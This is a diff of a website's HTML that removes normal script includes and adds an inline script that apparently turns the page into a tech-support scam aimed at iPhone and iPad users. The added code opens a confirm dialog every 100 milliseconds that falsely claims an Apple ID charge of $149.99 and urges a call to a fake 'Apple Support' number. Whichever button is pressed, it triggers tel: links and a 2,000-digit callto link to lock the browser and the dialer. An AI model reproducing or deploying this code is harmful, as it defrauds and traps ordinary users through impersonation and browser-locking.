-            <script src="js/isotope.pkgd.min.js"></script>								
-			<script src="js/mail-script.js"></script>	
-			<script src="js/main.js"></script>	
-		</body>
-	</html>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-381-6140');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
